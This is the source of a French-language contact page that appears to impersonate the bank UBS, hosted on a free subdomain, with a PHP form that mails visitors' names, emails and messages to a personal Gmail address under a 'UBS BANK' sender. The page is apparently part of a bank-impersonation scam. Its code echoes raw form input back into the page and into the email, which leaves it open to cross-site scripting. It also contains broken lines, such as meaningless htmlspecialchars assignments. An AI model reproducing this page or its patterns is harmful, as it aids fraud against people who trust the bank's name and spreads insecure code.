<!DOCTYPE html>
<html lang="fr">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="css/stylesuivi.css">
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <title>UBS - Votre banque - plus de 150 ans | Monde</title>
    </head>

<body>
    <header>
       <a href="https://ubs-switzerlandb.000webhostapp.com/"><img class="logo" src="image/UBS_Logo_Semibold.svg" alt=""></a> 
    </header>

<!--menu-->
    <nav class="pixel16 pixel">
        <label for="menu-mobile" class="menu-mobile">Menu</label>
        <input type="checkbox" name="" id="menu-mobile">
        <ul>
            <li><a href="https://ubs-switzerlandb.000webhostapp.com/">Accueil</a></li>
            <li><a href="Banque-dinvestissement.html">Banque d'investissement</a></li>
            <li><a href="Gestion-de-patrimoine.html">Gestion de patrimoine</a></li>
            <li><a href="À-propos-de-nous.html">À propos de nous</a></li>
            <li><a href="Contactez-nous.php">Contactez-nous</a></li>
        </ul>
    </nav>
     <!--fin menu-->


     <?php
     if(isset($_POST['mailform']))
     {
         if(!empty($_POST['nom']) AND !empty($_POST['mail']) AND !empty($_POST['message']))
         {
             $header="MIME-Version: 1.0\r\n";
             $header.='From:"UBS BANK"<support@primfx.com>'."\n";
             $header.='Content-Type:text/html; charset="uft-8"'."\n";
             $header.='Content-Transfer-Encoding: 8bit';
             $mail =  htmlspecialchars;
             $nom = htmlspecialchars;
             $message = htmlspecialchars;
             $message='
                     <div align="center">
                         <br />
                         <u>Nom de l\'expéditeur :</u>'.$_POST['nom'].'<br />
                         <u>Mail de l\'expéditeur :</u>'.$_POST['mail'].'<br />
                         <br />
                         '.nl2br($_POST['message']).'
                         <br />
                     </div>
                 </body>
             </html>
            ';
     
             mail("njoyamouhamed69@gmail.com", "CONTACT - UBS", $message, $header);
             $msg="Votre message a bien été envoyé !";
         }
         else
         {
             $msg="Tous les champs doivent être complétés !";
         }
     }
     ?><br>
        <div class="centreform">
             <h2>Formulaire de contact !</h2>
             <form method="POST" action="">
                Nom : <input type="text" name="nom" placeholder="Votre nom" value="<?php if(isset($_POST['nom'])) { echo $_POST['nom']; } ?>" /><br /><br />
                E-mail : <input type="email" name="mail" placeholder="Votre email" value="<?php if(isset($_POST['mail'])) { echo $_POST['mail']; } ?>" /><br /><br />
                Message : <textarea name="message" placeholder="Votre message"><?php if(isset($_POST['message'])) { echo $_POST['message']; } ?></textarea><br /><br />
                 <input class="boutonsuivi" type="submit" value="Envoyer !" name="mailform"/>
             </form><br><br>
             
        </div>

             <?php
             if(isset($msg))
             {
                 echo $msg;
             }
             ?>
    

     

        <!--debut footer-->

        <footer>
            <p style="color: black;">© UBS 1998-2020. Tous droits réservés.</p>
        </footer>
        <!--fin footer-->
        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
    </body>

</html>